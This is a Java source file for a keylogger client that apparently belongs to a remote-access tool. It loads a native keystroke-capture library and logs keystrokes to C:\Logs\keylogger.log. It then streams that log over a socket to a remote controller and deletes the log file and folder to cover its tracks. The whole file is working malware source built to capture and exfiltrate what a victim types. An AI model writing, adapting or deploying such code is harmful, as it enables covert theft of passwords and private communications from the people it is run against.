package Client.Keylogger;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;

public class Keylogger extends Thread {

	static {
		System.loadLibrary("libKeylogger");
	}

	/*
	 * Method: startKey
	 * 
	 * Parameter:Null Return Type: Void Functionality:Starts the Keylogger
	 */
	public native void startKey();

	/*
	 * Method: StopKey
	 * 
	 * Parameter:Null Return Type: Void Functionality:Stops the Keylogger
	 */
	public native void stopKey();

	// Object of the Socket Class
	Socket socket;

	boolean continueLoop = true;
	File file;
	File dir;

	public Keylogger(Socket socket) {
		this.socket = socket;
		dir = new File("C:\\Logs");
		dir.mkdir();
		file = new File("C:\\Logs\\keylogger.log");
		


	}

	public void run() {
		this.startKey();
		while (continueLoop) {
			continue;
		}
	}

	public void close() {
		this.stopKey();
		sendLogs();
		file.delete();
		dir.delete();
		System.out.println("Deleted");
		this.continueLoop = false;
	}

	// Sends the Keystrokes made by the client
	void sendLogs() {
		DataOutputStream dataOutput;
		try {
			dataOutput = new DataOutputStream(socket.getOutputStream());

			FileInputStream fileInput = new FileInputStream(file);
			byte[] buffer = new byte[4096];

			while (fileInput.read(buffer) > 0) {
				dataOutput.write(buffer);
			}
			fileInput.close();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

}
